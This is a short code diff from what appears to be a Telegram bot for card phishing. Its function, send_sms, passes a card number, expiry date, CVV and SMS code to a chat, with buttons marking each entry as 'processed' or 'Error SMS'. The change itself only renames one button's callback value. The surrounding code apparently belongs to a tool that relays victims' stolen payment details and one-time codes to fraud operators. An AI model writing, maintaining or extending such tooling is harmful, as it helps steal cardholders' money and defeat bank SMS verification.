@@ -60,7 +60,7 @@ def send_sms(CHAT_ID, card, date, cvv, sms, ID):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
-            InlineKeyboardButton("✅Отработан✅", callback_data='button1'),
+            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
             InlineKeyboardButton("Error SMS", callback_data='button2'),
         ],
         [
